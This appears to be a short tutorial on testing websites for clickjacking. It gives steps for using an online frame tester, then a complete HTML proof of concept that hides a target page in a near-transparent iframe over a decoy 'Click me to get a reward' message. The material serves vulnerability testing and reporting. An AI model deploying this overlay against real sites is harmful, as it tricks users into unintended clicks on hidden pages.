Clickjacking Test POC

Today in this article we'll share one of the BEST Click-Jacking Proof of Concept (POC), It consists of copyright-free text and code that can be used as a reference for making standard clickjacking POC: -

  • Pre steps
  • Code Proof (CP)

    • Pre steps

    Before letting anyone know about this threat/loophole first test it well, here are steps you can take to test any website for click-jacking vulnerabilities -

  • Go to click jacking-tester
  • Input the target URL in there
  • Click "check" button or hit enter
  • Wait and see if the website loads in "iFrame"

    • If it doesn't load, then it's safe from Click Jacking, but if it does load in iFrame then it's vulnerable to Click Jacking.

  • Grab the "result-URL" of the vulnerable website by clicking the "share results" button

    • Code Proof

                
<html>
<head>
    <style>
        #attacked_Site {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;
            z-index: 2;
        }
        #trap_site {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="trap_site">
    <p> Click me to get a reward  </p>
    </div>
    <iframe id="attacked_Site" src="https://example.com">
    </iframe>
</body>
</html>
  • Replace the "https://example" with your URL
